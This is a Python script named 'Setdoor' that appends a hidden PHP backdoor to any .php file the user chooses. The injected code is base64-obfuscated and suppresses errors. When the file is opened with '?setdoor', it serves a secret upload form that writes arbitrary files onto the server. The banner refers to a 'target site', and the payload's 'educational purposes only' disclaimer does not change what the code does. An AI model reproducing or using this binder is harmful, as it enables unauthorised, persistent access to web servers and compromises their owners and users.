#!/usr/bin/env python
import random
import os.path

colors = ['\033[1;31m', '\033[1;32m', '\033[1;33m', '\033[1;34m', '\033[1;35m', '\033[1;36m']
color = ['\033[2;36m', '\033[2;35m', '\033[2;34m', '\033[2;33m', '\033[2;32m', '\033[2;31m']
print(random.choice(colors))

print("▞▀▖   ▐    ▌",random.choice(colors))
print("▚▄ ▞▀▖▜▀ ▞▀▌▞▀▖▞▀ ▙▀▖",random.choice(colors))
print("▖ ▌▛▀ ▐ ▖▌ ▌▌ ▌▌ ▌▌",random.choice(colors))
print("▝▀ ▝▀▘ ▀ ▝▀▘▝▀ ▝▀ ▘",random.choice(colors))
print("<======================================================>")
print("     This is a Simple Php Backdoor Binder          ")
print("          Use this to bind a \nsecret file uploader to your .php file ")       
print("  Author © https://github.com/ShinazBinShajahan/ ")
print("<======================================================>")
print(random.choice(color))
print("<======================================================>")
print(":::::Uploaded Backdoor can be Accessed by :::::\n:::::adding \"?setdoor\" to the URL after :::::::\n:::::uploading your file to the server ::::::::\n example :: Yourtargetsite.com/yourfile.php?setfile")
print("<======================================================>")
print("\033[1;37m")
count = 1
while count < 10:
    print("\033[1;37m")
    print("\033[40m")
    filename = input("Enter your File's Name here>>> ")
    while not filename:
        filename = input("File Name cannot be Empty , Enter A Valid File Name >>> ")
    if os.path.isfile(filename) : 
        if filename.endswith('.php'):
            with open(filename, 'a') as f:
                f.write("<?php /* This is a Secret File Uploader , Use this for Educational Purposes only . The owner will not be responsible for any misuse of this uploader or backdoor */ error_reporting(0);if(isset($_GET[base64_decode('c2V0ZG9vcg==')])){echo base64_decode('U2V0ZG9vciBTZWNyZXQgVXBsb2FkZXI8YnI+');echo base64_decode('PGJyPg==');echo base64_decode('PGZvcm0gYWN0aW9uPSIiIG1ldGhvZD0icG9zdCIgZW5jdHlwZT0ibXVsdGlwYXJ0L2Zvcm0tZGF0YSIgbmFtZT0idXBsb2FkZXIiIGlkPSJ1cGxvYWRlciI+');echo base64_decode('PGlucHV0IHR5cGU9ImZpbGUiIG5hbWU9ImZpbGUiIHNpemU9IjUwIj48aW5wdXQgbmFtZT0iX3VwbCIgdHlwZT0ic3VibWl0IiBpZD0iX3VwbCIgdmFsdWU9IlVwbG9hZCI+PC9mb3JtPg==');if($_POST[base64_decode('X3VwbA==')]==base64_decode('VXBsb2Fk')){if(@copy($_FILES[base64_decode('ZmlsZQ==')][base64_decode('dG1wX25hbWU=')],$_FILES[base64_decode('ZmlsZQ==')][base64_decode('bmFtZQ==')])){echo base64_decode('PGI+VXBsb2FkZWQgU3VjY2Vzc2Z1bGx5ISEhPC9iPjxicj48YnI+');}else{echo base64_decode('PGI+VXBsb2FkZWQgU3VjY2Vzc2Z1bGx5ICEhITwvYj48YnI+PGJyPg==');}}}?>")
                f.write("\n")
                print("\033[1;32m")
                print("Backdoor successfully added to " , filename , "!"  )
                print("To access the backdoor , upload ",filename,"to a server and open it as",filename,"?setdoor")
                exiter=input("Do you want to Exit? [Y/N] : ")
                exiter = exiter.lower()
                if exiter=="y":
                    print("Thank you for using Setdoor \n Exiting.......")
                    count = 20
                elif exiter=="n":
                    count = 3
                else :
                    print("Invalid input , Exiting..........!")
                    count=30
        else :
            print("\033[1;31m")
            print("Please Select a file with .php or Rename , \n" , filename ,"to", filename ,".php")
            exiter=input("Do you want to Exit? [Y/N] : ")
            exiter = exiter.lower()
            if exiter=="y":
                print("Thank you for using Setdoor \nExiting........!")
                count = 20
            elif exiter =="n" :
                count = 3
            else :
                print("Invalid input , Exiting..........!")
                count = 30
    else : 
        print("\033[1;31m")
        print("\033[47m")
        print("File Does not Exists ! ")
        exiter=input("Do you want to Exit ? [Y/N] : ")
        exiter = exiter.lower()
        if exiter=="n":
            count = 3
        elif exiter=="y":
            print("Thank you for using Setdoor \nExiting..........!")
            count = 20
        else :
            print("Invalid input , Exiting..........!")
            count = 30
#this is a simple script made by Shinaz Bin Shajahan
#please give credits if you copy the script
#thank you for using SetDoor
